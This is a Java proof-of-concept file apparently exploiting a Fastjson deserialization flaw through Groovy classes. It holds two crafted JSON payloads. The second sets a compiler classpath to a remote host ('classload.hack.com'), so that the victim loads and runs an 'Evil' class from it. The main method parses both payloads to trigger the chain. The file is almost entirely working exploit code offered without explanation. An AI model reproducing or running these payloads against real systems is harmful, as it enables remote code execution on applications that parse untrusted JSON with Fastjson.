import com.alibaba.fastjson.JSON;

public class groovy {
    private static String poc1 = "{\n" +
            "    \"@type\":\"java.lang.Exception\",\n" +
            "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
            "    \"unit\":{}\n" +
            "}";

    private static String poc2 = "{\n" +
            "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
            "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
            "    \"config\":{\n" +
            "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
            "        \"classpathList\":\"http://classload.hack.com/\"\n" +
            "    }\n" +
            "}";

    /*
    META-INF/services/org.codehaus.groovy.transform.ASTTransformation
        Evil

    Evil.class
     */

    public static void main(String[] args) {
        try {
            JSON.parseObject(poc1);
        } catch (Exception e){}

        JSON.parseObject(poc2);
    }

}
